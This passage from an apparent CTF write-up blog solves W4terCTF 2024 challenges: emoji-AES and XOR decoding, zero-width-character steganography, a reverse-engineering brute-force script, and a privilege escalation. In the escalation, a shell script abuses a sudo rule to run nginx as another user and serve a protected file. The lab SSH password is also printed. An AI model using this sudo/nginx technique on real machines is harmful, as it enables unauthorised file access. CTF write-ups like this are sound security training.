<p>逗号换成\u</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">\u59\u6f\u75\u20\u6c\u69\u6b\u65\u20\u65\u6d\u6f\u6a\u69\u73\u2c\u20\u64\u6f\u6e\u27\u74\u20\u79\u6f\u75\u3f\u0a\u0a<span class="hljs-symbol">\u01f6</span>43<span class="hljs-symbol">\u01f4</span>b5<span class="hljs-symbol">\u01f3</span>3f<span class="hljs-symbol">\u01f3</span>a4<span class="hljs-symbol">\u01f6</span>aa<span class="hljs-symbol">\u01f3</span>0f<span class="hljs-symbol">\u01f4</span>0e<span class="hljs-symbol">\u01f9</span>4b<span class="hljs-symbol">\u01f6</span>ab<span class="hljs-symbol">\u01f6</span>06<span class="hljs-symbol">\u2705</span><span class="hljs-symbol">\u01f6</span>06<span class="hljs-symbol">\u01f6</span>b0<span class="hljs-symbol">\u01f4</span>c2<span class="hljs-symbol">\u01f3</span>2a<span class="hljs-symbol">\u263a</span><span class="hljs-symbol">\u01f6</span>e9<span class="hljs-symbol">\u01f3</span>0f<span class="hljs-symbol">\u01f4</span>c2<span class="hljs-symbol">\u01f5</span>79<span class="hljs-symbol">\u01f9</span>93<span class="hljs-symbol">\u01f4</span>05<span class="hljs-symbol">\u01f3</span>75<span class="hljs-symbol">\u01f3</span>88<span class="hljs-symbol">\u01f6</span>00<span class="hljs-symbol">\u01f5</span>04<span class="hljs-symbol">\u01f6</span>ab<span class="hljs-symbol">\u01f3</span>a4<span class="hljs-symbol">\u01f9</span>93<span class="hljs-symbol">\u2705</span><span class="hljs-symbol">\u01f4</span>ee<span class="hljs-symbol">\u01f3</span>a4<span class="hljs-symbol">\u01f3</span>85<span class="hljs-symbol">\u01f3</span>4e<span class="hljs-symbol">\u01f6</span>43<span class="hljs-symbol">\u01f3</span>09<span class="hljs-symbol">\u01f3</span>83<span class="hljs-symbol">\u01f3</span>4d<span class="hljs-symbol">\u01f3</span>74<span class="hljs-symbol">\u01f4</span>63<span class="hljs-symbol">\u01f6</span>b9<span class="hljs-symbol">\u01f9</span>23<span class="hljs-symbol">\u01f4</span>18<span class="hljs-symbol">\u01f3</span>f9<span class="hljs-symbol">\u263a</span><span class="hljs-symbol">\u01f4</span>63<span class="hljs-symbol">\u01f4</span>a7<span class="hljs-symbol">\u01f4</span>63<span class="hljs-symbol">\u01f9</span>93<span class="hljs-symbol">\u01f3</span>3f<span class="hljs-symbol">\u2328</span><span class="hljs-symbol">\u01f3</span>2a<span class="hljs-symbol">\u01f3</span>0f<span class="hljs-symbol">\u01f6</span>43<span class="hljs-symbol">\u01f3</span>75<span class="hljs-symbol">\u2753</span><span class="hljs-symbol">\u2602</span><span class="hljs-symbol">\u01f3</span>09<span class="hljs-symbol">\u01f6</span>06<span class="hljs-symbol">\u01f3</span>f9<span class="hljs-symbol">\u01f3</span>75<span class="hljs-symbol">\u01f4</span>a7<span class="hljs-symbol">\u01f3</span>85<span class="hljs-symbol">\u01f4</span>49<span class="hljs-symbol">\u01f3</span>0a<span class="hljs-symbol">\u01f6</span>b9<span class="hljs-symbol">\u01f6</span>aa<span class="hljs-symbol">\u01f3</span>74<span class="hljs-symbol">\u01f6</span>0e<span class="hljs-symbol">\u01f3</span>83<span class="hljs-symbol">\u01f3</span>2a<span class="hljs-symbol">\u01f6</span>43<span class="hljs-symbol">\u01f4</span>41<span class="hljs-symbol">\u01f9</span>4b<span class="hljs-symbol">\u01f4</span>51<span class="hljs-symbol">\u01f4</span>a7<span class="hljs-symbol">\u01f4</span>18<span class="hljs-symbol">\u01f3</span>a4<span class="hljs-symbol">\u01f9</span>4b<span class="hljs-symbol">\u01f4</span>18<span class="hljs-symbol">\u01f6</span>e9<span class="hljs-symbol">\u01f9</span>23<span class="hljs-symbol">\u01f3</span>09<span class="hljs-symbol">\u01f6</span>e9<span class="hljs-symbol">\u23e9</span><span class="hljs-symbol">\u01f6</span>0d<span class="hljs-symbol">\u2753</span><span class="hljs-symbol">\u01f4</span>18<span class="hljs-symbol">\u01f6</span>21<span class="hljs-symbol">\u2600</span><span class="hljs-symbol">\u01f6</span>0d<span class="hljs-symbol">\u01f6</span>43<span class="hljs-symbol">\u01f6</span>01<span class="hljs-symbol">\u01f6</span>00<span class="hljs-symbol">\u01f6</span>01<span class="hljs-symbol">\u01f6</span>ab<span class="hljs-symbol">\u01f4</span>c2<span class="hljs-symbol">\u2705</span><span class="hljs-symbol">\u2603</span><span class="hljs-symbol">\u01f6</span>ab<span class="hljs-symbol">\u01f6</span>0e<span class="hljs-symbol">\u01f5</span>2a<span class="hljs-symbol">\u01f4</span>51<span class="hljs-symbol">\u01f6</span>00<span class="hljs-symbol">\u01f5</span>79<span class="hljs-symbol">\u01f6</span>ab<span class="hljs-symbol">\u01f6</span>0d<span class="hljs-symbol">\u01f3</span>2a<span class="hljs-symbol">\u01f4</span>c2<span class="hljs-symbol">\u01f4</span>4c<span class="hljs-symbol">\u01f3</span>4d<span class="hljs-symbol">\u01f4</span>4c<span class="hljs-symbol">\u01f9</span>93<span class="hljs-symbol">\u01f5</span>90<span class="hljs-symbol">\u01f9</span>23<span class="hljs-symbol">\u01f6</span>0e<span class="hljs-symbol">\u01f3</span>ce<span class="hljs-symbol">\u01f3</span>4d<span class="hljs-symbol">\u01f3</span>f9<span class="hljs-symbol">\u01f3</span>4c<span class="hljs-symbol">\u01f3</span>4d<span class="hljs-symbol">\u01f3</span>a4<span class="hljs-symbol">\u2600</span><span class="hljs-symbol">\u01f3</span>f9<span class="hljs-symbol">\u01f3</span>88<span class="hljs-symbol">\u01f6</span>b0<span class="hljs-symbol">\u01f4</span>a7<span class="hljs-symbol">\u2600</span><span class="hljs-symbol">\u2709</span><span class="hljs-symbol">\u01f3</span>f9<span class="hljs-symbol">\u01f3</span>4d<span class="hljs-symbol">\u01f9</span>93<span class="hljs-symbol">\u01f3</span>85<span class="hljs-symbol">\u01f3</span>74<span class="hljs-symbol">\u2602</span><span class="hljs-symbol">\u23e9</span><span class="hljs-symbol">\u01f6</span>aa<span class="hljs-symbol">\u01f4</span>0d<span class="hljs-symbol">\u263a</span><span class="hljs-symbol">\u01f4</span>18<span class="hljs-symbol">\u01f6</span>07<span class="hljs-symbol">\u01f6</span>21<span class="hljs-symbol">\u01f3</span>75<span class="hljs-symbol">\u01f3</span>0f<span class="hljs-symbol">\u01f9</span>93<span class="hljs-symbol">\u01f3</span>75<span class="hljs-symbol">\u01f6</span>e9<span class="hljs-symbol">\u01f4</span>c2<span class="hljs-symbol">\u01f4</span>4c<span class="hljs-symbol">\u01f3</span>f9<span class="hljs-symbol">\u01f5</span>d2<span class="hljs-symbol">\u01f5</span>d2\u0a\u0a\u42\u74\u77\u2c\u20\u74\u68\u65\u20\u6b\u65\u79\u20\u69\u73\u20\u22\u4b\u45\u59\u22<br></code></pre></td></tr></table></figure>
<p>把这个放到<a target="_blank" rel="noopener" href="https://www.ifreesite.com/unicode/%EF%BC%8C%E5%BE%97%E5%88%B0">https://www.ifreesite.com/unicode/，得到</a></p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">You <span class="hljs-built_in">like</span> emojis, don<span class="hljs-comment">&#x27;t you?</span><br><br>🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅😆🚰📂🌪☺🛩🌏📂🕹🦓🐅🍵🎈😀🔄🚫🎤🦓✅📮🎤🎅🍎🙃🌉🎃🍍🍴👣🚹🤣🐘🏹☺👣💧👣🦓🌿⌨🌪🌏🙃🍵❓☂🌉😆🏹🍵💧🎅👉🌊🚹🚪🍴😎🎃🌪🙃👁🥋👑💧🐘🎤🥋🐘🛩🤣🌉🛩⏩😍❓🐘😡☀😍🙃😁😀😁🚫📂✅☃🚫😎🔪👑😀🕹🚫😍🌪📂👌🍍👌🦓🖐🤣😎🏎🍍🏹🍌🍍🎤☀🏹🎈🚰💧☀✉🏹🍍🦓🎅🍴☂⏩🚪🐍☺🐘😇😡🍵🌏🦓🍵🛩📂👌🏹🗒🗒<br><br>Btw, the <span class="hljs-keyword">key</span> <span class="hljs-built_in">is</span> <span class="hljs-string">&quot;KEY&quot;</span><br></code></pre></td></tr></table></figure>
<p>使用<a target="_blank" rel="noopener" href="https://aghorler.github.io/emoji-aes/">https://aghorler.github.io/emoji-aes/</a></p>
<p>key = 🔑, 得到</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">0</span>x???? ⊕ dxBUQVJndGJbbGByE3tGUW57VxV0bH9db3FSe2YFUndUexVUYWl<span class="hljs-regexp">/QW1FAW1/</span>bW57EhQSEF0=<br></code></pre></td></tr></table></figure>
<p>进行base64解码</p>
<p><img src="./W4terCTF2024.assets/NcwrtAGylDIOVU9.png" srcset="/img/loading.gif" lazyload alt="spam2024"></p>
<p>做异或操作，可以猜测开头就是<code>W4</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-comment"># base64解码后的数据</span><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(s)&gt;<span class="hljs-number">1</span>:<br><br>    arr = []<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> s:<br>        arr.append(<span class="hljs-built_in">ord</span>(x))<br>    <span class="hljs-built_in">print</span>(arr)<br>    h = <span class="hljs-built_in">ord</span>(s[<span class="hljs-number">0</span>])^<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;W&#x27;</span>)<br>    l = <span class="hljs-built_in">ord</span>(s[<span class="hljs-number">1</span>])^<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i,x <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(arr):<br>        <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>            arr[i] = arr[i]^h<br>        <span class="hljs-keyword">else</span>:<br>            arr[i] = arr[i]^l<br>    ret = <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> arr:<br>        ret += <span class="hljs-built_in">chr</span>(x)<br>    <span class="hljs-built_in">print</span>(ret)<br>    s=s[<span class="hljs-number">1</span>:<span class="hljs-built_in">len</span>(s)]<br></code></pre></td></tr></table></figure>
<p>得到:</p>
<p><code>W4terCTF&#123;H@V3_fuN_w1TH_yOUr_F!rSt_5pAM_eMa!I_IN_2024&#125;</code></p>
<h3 id="GZGPT">GZGPT</h3>
<p>这里漏出鸡脚了：</p>
<p><img src="./W4terCTF2024.assets/image-20240429224922930.png" srcset="/img/loading.gif" lazyload alt="鸡脚"></p>
<p>于是分析每一行的末尾：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.log&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    lines = f.readlines()<br><br>tails = [line[-<span class="hljs-number">9</span>:-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines]<br>tails = [tail <span class="hljs-keyword">for</span> tail <span class="hljs-keyword">in</span> tails <span class="hljs-keyword">if</span> tail[-<span class="hljs-number">1</span>] <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;\u200c&#x27;</span>, <span class="hljs-string">&#x27;\u200d&#x27;</span>)]<br>tails[:<span class="hljs-number">10</span>]<br></code></pre></td></tr></table></figure>
<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs clojure">[&#x27;<span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200d</span>&#x27;<span class="hljs-punctuation">,</span><br> &#x27;<span class="hljs-character">\u200c</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200c</span>&#x27;<span class="hljs-punctuation">,</span><br> &#x27;<span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200c</span>&#x27;<span class="hljs-punctuation">,</span><br> &#x27;<span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span>&#x27;<span class="hljs-punctuation">,</span><br> &#x27;<span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200c</span>&#x27;<span class="hljs-punctuation">,</span><br> &#x27;<span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200d</span>&#x27;<span class="hljs-punctuation">,</span><br> &#x27;<span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200c</span>&#x27;<span class="hljs-punctuation">,</span><br> &#x27;<span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200c</span>&#x27;<span class="hljs-punctuation">,</span><br> &#x27;<span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200d</span>&#x27;<span class="hljs-punctuation">,</span><br> &#x27;<span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200c</span><span class="hljs-character">\u200d</span>&#x27;]<br></code></pre></td></tr></table></figure>
<p>可以看到有一些行的末尾有且仅有8个这种不可见字符，不是所有行都有，但是经验证，这样的行的数量每次都是恒定的。</p>
<p>八位，两种字符，一种当0一种当1试了试：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">d = &#123;<br>    <span class="hljs-string">&quot;\u200c&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-string">&quot;\u200d&quot;</span>: <span class="hljs-number">1</span>,<br>&#125;<br>b_tails = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">str</span>(d[c]) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> tail]), <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> tail <span class="hljs-keyword">in</span> tails])<br>b_tails<br></code></pre></td></tr></table></figure>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">W<span class="hljs-number">4</span>terCTF&#123;I<span class="hljs-symbol">NTRUdER_o1</span>_mY_H<span class="hljs-number">3</span>ART_l<span class="hljs-symbol">n_APR1</span>l&#125;W<span class="hljs-number">4</span>terCTF&#123;I<span class="hljs-symbol">NTRUdER_o1</span>_mY_H<span class="hljs-number">3</span>ART_l<span class="hljs-symbol">n_APR1</span>l&#125;W<span class="hljs-number">4</span>terCTF&#123;I<span class="hljs-symbol">NTRUdER_o1</span>_mY_H<span class="hljs-number">3</span>ART_l<span class="hljs-symbol">n_APR1</span><br></code></pre></td></tr></table></figure>
<h3 id="Priv-Escape">Priv Escape</h3>
<p>首先找 flag ，在 <code>/tmp/flag</code> 找到了，但是没权限读！然后还发现这个文件的 owner 居然不是 <code>root</code> ，而是 <code>r00t</code> （什么高仿 root），这或许就意味着不需要 root 权限也能得到 flag 。</p>
<p><code>find</code> 查找和 <code>r00t</code> 用户有关的所有文件、目录，会发现 nginx 非常可疑，但这还不够。</p>
<p>关键切入点在于查看与本用户执行权限相关信息：</p>
<figure class="highlight shell"><figcaption><span>shell</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l<br></code></pre></td></tr></table></figure>
<p>然后发现 nginx 露出了鸡脚：</p>
<figure class="highlight shell"><figcaption><span>shell</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">User W4terCTFPlayer may run the following commands on<br>        priv-escape-5ee9f22c905b4d86:<br>    (r00t) NOPASSWD: /usr/sbin/nginx<br></code></pre></td></tr></table></figure>
<p>这意味着我们的用户可以以 <code>r00t</code> 的身份运行 nginx ，那么依靠 nginx 的网页我们就能读取 <code>/tmp/flag</code> 。</p>
<p>直接运行 <code>sudo -u r00t nginx</code> ，虽然启动了 nginx ，但是我们不知道咋访问 <code>/tmp/flag</code> ，因为权限问题也无法将 <code>/tmp/flag</code> 软链接到 <code>/var/www/html</code> ，所以我们搞了个脚本用自己的 nginx 配置：</p>
<figure class="highlight shell"><figcaption><span>hack.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>cp -rf /etc/nginx /home/W4terCTFPlayer/nginx<br><br>echo &quot;user r00t;<br>worker_processes auto;<br>pid /home/W4terCTFPlayer/nginx/nginx.pid;<br><br>events &#123;<br>	worker_connections 768;<br>&#125;<br><br>http &#123;<br>	sendfile on;<br>	tcp_nopush on;<br>	types_hash_max_size 2048;<br><br>	include /home/W4terCTFPlayer/nginx/mime.types;<br>	default_type application/octet-stream;<br><br><br>	ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE<br>	ssl_prefer_server_ciphers on;<br><br>	gzip on;<br><br>	include /home/W4terCTFPlayer/nginx/conf.d/*.conf;<br>	include /home/W4terCTFPlayer/nginx/sites-enabled/*;<br>&#125;&quot; &gt; /home/W4terCTFPlayer/nginx/nginx.conf<br><br>rm /home/W4terCTFPlayer/nginx/sites-enabled/default<br><br>echo &quot;server &#123;<br>	listen 8083 default_server;<br>	listen [::]:8083 default_server;<br><br>	root /tmp;<br><br>	index index.html index.nginx-debian.html;<br><br>	server_name _;<br><br>	location / &#123;<br>		try_files $uri $uri/ =404;<br>	&#125;<br>&#125;&quot; &gt; /home/W4terCTFPlayer/nginx/sites-enabled/default<br><br>echo &#x27;&lt;!DOCTYPE html&gt;<br>&lt;html lang=&quot;en&quot;&gt;<br>&lt;head&gt;<br>    &lt;meta charset=&quot;UTF-8&quot;&gt;<br>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;<br>    &lt;title&gt;Document&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    114514<br>&lt;/body&gt;<br>&lt;/html&gt;&#x27; &gt; /tmp/index.html<br><br>chmod 777 -R /home/W4terCTFPlayer # 不要忘了给 r00t 我们的文件目录访问权限<br><br>sudo -u r00t nginx -c /home/W4terCTFPlayer/nginx/nginx.conf # 启动nginx<br></code></pre></td></tr></table></figure>
<p>然后执行：</p>
<figure class="highlight shell"><figcaption><span>shell</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">We1c0meToW4terCTF2024!</span><br><br>scp -P 64780 hack.sh W4terCTFPlayer@127.0.0.1:/home/W4terCTFPlayer  # 输入一下密码<br><br>ssh W4terCTFPlayer@127.0.0.1 -p 64780  # 输入一下密码<br><br>chmod 777 hack.sh<br><br>./hack.sh<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">sudo -u r00t nginx -s reload -c /home/W4terCTFPlayer/nginx/nginx.conf  <span class="hljs-comment"># 用来重新加载 nginx 配置文件</span></span><br><br>curl https://127.0.0.1:8083/flag<br></code></pre></td></tr></table></figure>
<p>然而中途遇到了阻碍，写 WP 的时候才发现似乎是因为我们写脚本的同学用的 mac 的 shell 导致的，在 echo 的时候将 <code>/home/W4terCTFPlayer/nginx/sites-enabled/default</code> 里的 <code>$uri</code> 当成了环境变量？！然后 nginx 返回 301 … 脚本里把 <code>$uri</code> 改成 <code>\$uri</code> 就好了</p>
<p><code>W4terCTF&#123;eScAp3_THE_BouNdarles_OF_n9lnX_pRIvi1eGeS&#125;</code></p>
<h2 id="Reverse">Reverse</h2>
<h3 id="BruteforceMe">BruteforceMe</h3>
<p>下载的附件是一个程序，运行程序后可以输入flag，程序会判断flag长度是否正确，如果长度正确，会给出flag经过加密后经比对有多少字符符合</p>
<p>所以，只需要一个python脚本猜测每一位的字符，脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> random<br>input_data = <span class="hljs-string">&quot;W4terCTF###################################&quot;</span> <span class="hljs-comment"># len = 43</span><br>arr = <span class="hljs-built_in">list</span>(input_data)<br><span class="hljs-built_in">print</span>(arr)<br>voc = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;_&quot;</span><br>            <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br>    input_data = <span class="hljs-string">&#x27;&#x27;</span>.join(arr)<br>    command = [<span class="hljs-string">&quot;./BruteforceMe&quot;</span>]<br><br>    <span class="hljs-comment"># 作为子进程启动外部程序</span><br>    process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment"># 输入数据到程序的标准输入</span><br><br>    process.stdin.write(input_data)<br>    process.stdin.flush()<br><br>    <span class="hljs-comment"># 从标准输出读取程序的输出</span><br>    output_data, _ = process.communicate()<br>    <span class="hljs-comment">#print(output_data)</span><br>    j=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i,x <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(output_data):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> x.isnumeric():<br>            j=i+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br>    tmp=[]<br>    <span class="hljs-keyword">while</span> output_data[j].isnumeric():<br>        tmp.append(output_data[j])<br>        j+=<span class="hljs-number">1</span><br>    c_num = <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(tmp))<br>    <span class="hljs-comment">#print(input_data)</span><br>    <span class="hljs-comment"># 打印输出</span><br>    <span class="hljs-comment">#print(output_data)</span><br>    <span class="hljs-comment">#print(c_num)</span><br>    <span class="hljs-keyword">return</span> c_num<br><br>    <br><span class="hljs-keyword">while</span> get_flag() &lt; <span class="hljs-number">60</span>:<br>    <span class="hljs-comment"># 随机打乱voc</span><br>    voc = <span class="hljs-built_in">list</span>(voc)<br>    random.shuffle(voc)<br>    voc = <span class="hljs-string">&#x27;&#x27;</span>.join(voc)<br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">43</span>):<br>        old = get_flag()<br>        <span class="hljs-comment">#print(f&quot;&#123;t&#125;,&#123;old&#125;: &quot;)</span><br>        cur_best = old<br>        <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> voc:<br>            old_arr = arr[t]<br>            arr[t]=v<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(arr))<br>            new = get_flag()<br>            arr[t]=old_arr<br>            <span class="hljs-keyword">if</span> new &gt;= cur_best:<br>                <span class="hljs-comment">#print(f&quot;&#123;v&#125;,&#123;new&#125;;&quot;,end=&#x27; &#x27;)</span><br>                arr[t]=v<br>                cur_best = new<br>        <span class="hljs-comment">#print(&#x27;&#x27;)</span><br>        <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;best: <span class="hljs-subst">&#123;get_flag()&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(arr))<br></code></pre></td></tr></table></figure>
<p>在和BruteforceMe同文件夹下执行这个脚本，直到程序遇到报错停止，最后一个输出就是flag</p>
<p>一般while循环执行3轮就能得到结果，运行时间1分钟以内</p>
